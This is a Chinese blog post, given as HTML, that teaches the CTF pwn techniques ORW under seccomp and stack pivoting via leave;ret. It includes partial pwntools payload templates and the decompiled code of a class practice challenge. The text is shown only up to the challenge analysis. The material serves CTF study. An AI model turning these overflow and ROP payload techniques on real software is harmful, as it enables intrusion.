@@ -1,0 +1,536 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 8.0.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/meow.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/meow.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="ytiTpj8Ol2naa1JDTwZxRYelNQFe4fgRvG5XcJmZ9N0">
+  <meta name="msvalidate.01" content="2B6959B722A9727D346D9795E31C5112">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"mintind.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.27.0","exturl":true,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"always","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"tokyo-night-dark","dark":"tokyo-night-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"flat"},"fold":{"enable":true,"height":500},"language":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="冷たいその手 君のせいじゃない。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ORW (Open-Read-Write)策略&amp;栈迁移">
+<meta property="og:url" content="https://mintind.github.io/2026/03/23/CTF/PWN/ORW&%E6%A0%88%E8%BF%81%E7%A7%BB/index.html">
+<meta property="og:site_name" content="Mintind&#39;s Blog">
+<meta property="og:description" content="冷たいその手 君のせいじゃない。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://mintind.github.io/2026/03/23/CTF/PWN/ORW&%E6%A0%88%E8%BF%81%E7%A7%BB/image-20260330194707066.png">
+<meta property="og:image" content="https://mintind.github.io/2026/03/23/CTF/PWN/ORW&%E6%A0%88%E8%BF%81%E7%A7%BB/image-20260330195534002.png">
+<meta property="og:image" content="https://mintind.github.io/2026/03/23/CTF/PWN/ORW&%E6%A0%88%E8%BF%81%E7%A7%BB/image-20260331215742304.png">
+<meta property="article:published_time" content="2026-03-23T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-03-23T16:00:00.000Z">
+<meta property="article:author" content="Mintind">
+<meta property="article:tag" content="PWN">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://mintind.github.io/2026/03/23/CTF/PWN/ORW&%E6%A0%88%E8%BF%81%E7%A7%BB/image-20260330194707066.png">
+
+
+<link rel="canonical" href="https://mintind.github.io/2026/03/23/CTF/PWN/ORW&%E6%A0%88%E8%BF%81%E7%A7%BB/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://mintind.github.io/2026/03/23/CTF/PWN/ORW&%E6%A0%88%E8%BF%81%E7%A7%BB/","path":"2026/03/23/CTF/PWN/ORW&栈迁移/","title":"ORW (Open-Read-Write)策略&栈迁移"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>ORW (Open-Read-Write)策略&栈迁移 | Mintind's Blog</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script><script src="/js/bookmark.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Mintind's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">此心安处是吾乡</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">60</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">16</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">80</span></a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ORW"><span class="nav-number">1.</span> <span class="nav-text">ORW</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B2%99%E7%AE%B1%E4%BF%9D%E6%8A%A4"><span class="nav-number">1.1.</span> <span class="nav-text">沙箱保护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ROP%E9%93%BE%E7%9A%84ORW"><span class="nav-number">1.2.</span> <span class="nav-text">ROP链的ORW</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mmap-%E5%87%BD%E6%95%B0"><span class="nav-number">1.3.</span> <span class="nav-text">mmap()函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB"><span class="nav-number">2.</span> <span class="nav-text">栈迁移</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#leave-ret"><span class="nav-number">2.1.</span> <span class="nav-text">leave; ret</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E6%A0%88%E8%BF%81%E7%A7%BB%E7%9A%84%E5%BF%85%E8%A6%81%E6%9D%A1%E4%BB%B6"><span class="nav-number">2.2.</span> <span class="nav-text">使用栈迁移的必要条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#payload%E5%A4%A7%E6%A6%82%E9%95%BF%E8%BF%99%E6%A0%B7"><span class="nav-number">2.3.</span> <span class="nav-text">payload大概长这样</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#64%E4%BD%8D"><span class="nav-number">2.3.1.</span> <span class="nav-text">64位</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#32%E4%BD%8D"><span class="nav-number">2.3.2.</span> <span class="nav-text">32位</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98"><span class="nav-number">3.</span> <span class="nav-text">题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9C%8B"><span class="nav-number">3.1.</span> <span class="nav-text">看</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-number">3.2.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">3.3.</span> <span class="nav-text">exp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#more"><span class="nav-number">3.4.</span> <span class="nav-text">more</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Mintind</p>
+  <div class="site-description" itemprop="description">Record to Remember</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">80</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">60</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21pbnRpbmQ=" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;mintind"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://mintind.github.io/2026/03/23/CTF/PWN/ORW&%E6%A0%88%E8%BF%81%E7%A7%BB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Mintind">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Mintind's Blog">
+      <meta itemprop="description" content="Record to Remember">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="ORW (Open-Read-Write)策略&amp;栈迁移 | Mintind's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ORW (Open-Read-Write)策略&栈迁移<span class="exturl post-edit-link" data-url="aHR0cHM6Ly9naXRodWIuY29tL01pbnRpbmQvbWludGluZC1oZXhvLWJsb2cvZWRpdC9tYWluL3NvdXJjZS9fcG9zdHMvQ1RGL1BXTi9PUlcm5qCI6L+B56e7Lm1k" title="编辑"><i class="fa fa-pen-nib"></i></span>
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-03-24 00:00:00" itemprop="dateCreated datePublished" datetime="2026-03-24T00:00:00+08:00">2026-03-24</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>2.4k</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>冷たいその手 君のせいじゃない。</p>
+<span id="more"></span>
+
+<h2 id="ORW"><a href="#ORW" class="headerlink" title="ORW"></a>ORW</h2><blockquote>
+<p>参考&amp;引用：</p>
+<p><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL25ld3MvMTIyMzM=">https://xz.aliyun.com/news/12233<i class="fa fa-external-link-alt"></i></span></p>
+<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vZmFsbGluZy1kdXNrL3AvMTgxMDE1Mjg=">https://www.cnblogs.com/falling-dusk/p/18101528<i class="fa fa-external-link-alt"></i></span></p>
+</blockquote>
+<p><strong>ORW (Open-Read-Write)</strong> 策略：调用 <code>open</code> 打开 flag 文件，调用 <code>read</code> 读取内容，调用 <code>write</code> 将内容打印到屏幕。</p>
+<p>也就是想办法构造这些命令：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">open(<span class="string">&quot;flag&quot;</span>)   </span><br><span class="line">read(<span class="number">3</span>, <span class="string">&quot;buf&quot;</span>, <span class="number">0x100</span>) <span class="comment">// fd为3，表示从文件中读取</span></span><br><span class="line">write(<span class="number">1</span>, <span class="string">&quot;buf&quot;</span>, <span class="number">0x100</span>)  <span class="comment">// 标准输出</span></span><br></pre></td></tr></table></figure>
+
+<p>另外也不限于这几个函数，只要能达到绕过沙箱读取文件内容并且输出，应该可以随便组合（write换puts啥的）</p>
+<h3 id="沙箱保护"><a href="#沙箱保护" class="headerlink" title="沙箱保护"></a><strong>沙箱保护</strong></h3><p>沙箱保护是对程序加入一些保护，最常见的是禁用一些系统调用，如execve，使得我们不能通过系统调用execve或system等获取到远程终端权限，因此只能通过<strong>ROP</strong>的方式获取flag</p>
+<p>在ctf的pwn题中一般有两种函数调用方式实现沙盒机制，第一种是采用<strong>prctl</strong>函数调用，第二种是使用<strong>seccomp</strong>库函数。</p>
+<h3 id="ROP链的ORW"><a href="#ROP链的ORW" class="headerlink" title="ROP链的ORW"></a>ROP链的ORW</h3><p>寄存器和参数的对应关系：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">open(rdi--&gt;file_addr,rsi--&gt;oflag)</span><br><span class="line">read/write(rdi--&gt;fd,rsi--&gt;buf,rdx--&gt;s_nbytes)</span><br></pre></td></tr></table></figure>
+
+<h3 id="mmap-函数"><a href="#mmap-函数" class="headerlink" title="mmap()函数"></a>mmap()函数</h3><blockquote>
+<p>没碰到所以纯引用了 呆</p>
+</blockquote>
+<p>一般这种ORW题目给出的溢出大小不够我们写入很长的ROP链的，因此会提供mmap()函数，从而给出一段在栈上的内存</p>
+<p>使用mmap申请适合4byte的寄存器的地址</p>
+<p><strong>mmap()函数原型</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">void *mmap&#123;</span><br><span class="line">    void *addr; //映射区首地址，传NULL</span><br><span class="line">    size_t length; //映射区大小</span><br><span class="line">    //会自动调为4k的整数倍</span><br><span class="line">    //不能为0</span><br><span class="line">    //一般文件多大，length就指定多大</span><br><span class="line">    int prot; //映射区权限</span><br><span class="line">    //PROT_READ 映射区必须要有读权限</span><br><span class="line">    //PROT_WRITE</span><br><span class="line">    //PROT_READ | PROT_WRITE</span><br><span class="line">    int flags; //标志位参数</span><br><span class="line">    //MAP_SHARED 修改内存数据会同步到磁盘</span><br><span class="line">    //MAP_PRIVATE 修改内存数据不会同步到磁盘</span><br><span class="line">    int fd; //要映射文件所对应的文件描述符</span><br><span class="line">    off_t offset; //映射文件的偏移量，从文件哪个位置开始</span><br><span class="line">    //映射的时候文件指针的偏移量</span><br><span class="line">    //必须是4k的整数倍</span><br><span class="line">    //一般设为0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>mmap</th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>addr</td>
+<td>要申请的地址</td>
+<td>建议四位</td>
+</tr>
+<tr>
+<td>length</td>
+<td>从addr开始申请的长度</td>
+<td>建议一页0x1000</td>
+</tr>
+<tr>
+<td>prot</td>
+<td>权限</td>
+<td>7</td>
+</tr>
+<tr>
+<td>flags</td>
+<td>确定映射的更新是否对其他进程可见</td>
+<td>0x22</td>
+</tr>
+<tr>
+<td>fd</td>
+<td>映射到文件描述符fd</td>
+<td>0xFFFFFFFF</td>
+</tr>
+<tr>
+<td>offset</td>
+<td>映射偏移</td>
+<td>NULL</td>
+</tr>
+</tbody></table>
+<h2 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h2><blockquote>
+<p>参考&amp;引用：</p>
+<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vbWF4MXovcC8xNTI5OTAwMC5odG1sJUVGJUJDJTg4JUU1JTlCJUJFJUU1JUJFJTg4JUU2JUI4JTg1JUU2JUE1JTlBJUVGJUJDJThDJUU4JUJGJTk4JUU4JUFFJUIyJUU0JUJBJTg2JUU2JUEwJTg4JUU2JUJBJUEyJUU1JTg3JUJBJUVGJUJDJThDJUU4JUFGJUI3JUU3JTlDJThCJUVGJUJDJTg5">https://www.cnblogs.com/max1z/p/15299000.html（图很清楚，还讲了栈溢出，请看）<i class="fa fa-external-link-alt"></i></span></p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BhbHBpdGF0ZV9MTC9hcnRpY2xlL2RldGFpbHMvMTU0OTQ5Njgw">https://blog.csdn.net/Palpitate_LL/article/details/154949680<i class="fa fa-external-link-alt"></i></span> （哦这个图也好）</p>
+</blockquote>
+<p>打栈溢出的时候发现栈上没有足够的空间写shellcode的时候，可以使用栈迁移，将栈搬到别的地方去（将栈指针搬到别的地方去），然后在那个空间写shellcode。</p>
+<p>严肃一点说：劫持<code>rsp</code>寄存器指向攻击者可以布置<code>shellcode</code>的内存地址</p>
+<p>劫持<code>rsp</code>寄存器的指令有很多，最常用的就是函数的退栈返回指令<code>leave; ret</code>。</p>
+<p>除此之外，能控制rsp或者rbp的应该都行（pwn✌️说的）</p>
+<h3 id="leave-ret"><a href="#leave-ret" class="headerlink" title="leave; ret"></a>leave; ret</h3><p>复习一下leave和ret的含义</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">leave:</span><br><span class="line">mov rsp, rbp</span><br><span class="line">pop rbp</span><br><span class="line">ret:</span><br><span class="line">pop rip</span><br></pre></td></tr></table></figure>
+
+<p>执行<code>leave; ret</code>过程中栈的变化：</p>
+<p><img src="/2026/03/23/CTF/PWN/ORW&%E6%A0%88%E8%BF%81%E7%A7%BB/image-20260330194707066.png" alt="image-20260330194707066"></p>
+<p>可以看到在执行完<code>leave</code>指令后<code>rsp</code>寄存器指向了返回地址。所以想要让rsp指向目的地址的话，只需要通过栈溢出将rbp篡改，rsp也会被篡改。在这个目的地址处再布置需要的rop gadget，就能解决栈空间不足的问题</p>
+<p>两次<code>leave</code>将rsp劫持到任意地址：</p>
+<p><img src="/2026/03/23/CTF/PWN/ORW&%E6%A0%88%E8%BF%81%E7%A7%BB/image-20260330195534002.png" alt="image-20260330195534002"></p>
+<p>具体来说，设要转移的地址为TargetAddr，使用栈溢出将saved rbp处覆盖为TargetAddr-8（64位，32位是-4），将ret处覆盖为LeaveRetAddr（另一组 leave ret 的地址）。然后返回时：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">leave1:</span><br><span class="line">mov rsp, rbp	; [rsp] = TargetAddr-8, [rbp] = TargetAddr-8</span><br><span class="line">pop rbp			; [rsp] = LeaveRetAddr, rbp = TargetAddr-8</span><br><span class="line">ret1:</span><br><span class="line">pop rip			; rip = LeaveRetAddr</span><br><span class="line">leave2:</span><br><span class="line">mov rsp, rbp	; rsp = TargetAddr-8, rbp = TargetAddr-8</span><br><span class="line">pop rbp			; rsp = TargetAddr, rbp = *(TargetAddr-8,)</span><br><span class="line">ret:</span><br><span class="line">pop rip			; rip = *TargetAddr</span><br></pre></td></tr></table></figure>
+
+<p>在第二次leave时成功将rsp转移到了目标上</p>
+<h3 id="使用栈迁移的必要条件"><a href="#使用栈迁移的必要条件" class="headerlink" title="使用栈迁移的必要条件"></a>使用栈迁移的必要条件</h3><ol>
+<li>存在可以劫持程序流和控制rbp&#x2F;rsp寄存器的漏洞</li>
+<li>攻击者可以确定准确某一块具有读写权限的地址（常用bss段）</li>
+<li>存在leave ret 这类gadget指令</li>
+</ol>
+<h3 id="payload大概长这样"><a href="#payload大概长这样" class="headerlink" title="payload大概长这样"></a>payload大概长这样</h3><p>就是传参方式的区别</p>
+<h4 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x100</span> + p64(bss_base) </span><br><span class="line">payload1 += p64(pop_rdi) + p64(<span class="number">0</span>) + p64(pop_rsi_r15) + p64(bss_base) + p64(<span class="number">0</span>) + p64(read_plt) <span class="comment"># read(0, bss_base)，从标准输入读取payload2存入bss_base</span></span><br><span class="line">payload1 += p64(leave_ret) <span class="comment"># 转移rsp到bss_base</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">payload2 = p64(bss_base + <span class="number">0x100</span>) <span class="comment"># pop到rbp，这里选一个合理一点的栈底</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">40</span> + p32(bss_addr) </span><br><span class="line">payload1 += p32(read_plt) + p32(leave_ret) + p32(<span class="number">0</span>) + p32(bss_addr) += p32(<span class="number">0x400</span>)  <span class="comment"># read(0, bss_addr, 0x400)</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">payload2 = p32(bss_addr + <span class="number">0x400</span>) <span class="comment"># ebp</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="题"><a href="#题" class="headerlink" title="题"></a>题</h2><p>这是一道课堂练习ROP题</p>
+<h3 id="看"><a href="#看" class="headerlink" title="看"></a>看</h3><p>x64</p>
+<p>main函数，有个沙箱，然后主要逻辑是判断输入，4919到vuln()，9011到some_gifts()</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">install_seccomp(argc, argv, envp);</span><br><span class="line">...</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;n9011);</span><br><span class="line"><span class="keyword">if</span> ( n9011 == <span class="number">4919</span> )</span><br><span class="line">&#123;</span><br><span class="line">  vuln();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( n9011 != <span class="number">9011</span> )</span><br><span class="line">    _exit(<span class="number">1</span>);</span><br><span class="line">  some_gifts();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>vuln，有溢出。缓冲区大小0x100，读0x150，有0x50空间溢出</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">256</span>]; <span class="comment">// [rsp+0h] [rbp-100h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x150u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>some_gifts，读取.&#x2F;gifts.txt的内容，输出</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">some_gifts</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE s[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-1010h] BYREF</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+100Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  fd = sys_open(<span class="string">&quot;./gifts.txt&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x1000u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( read(fd, s, <span class="number">0x1000u</span>) &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;read error&quot;</span>);</span><br><span class="line">    _exit(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, s, <span class="number">0x1000u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>main 函数开头调用了 install_seccomp。这题的沙箱就是用的prctl</p>
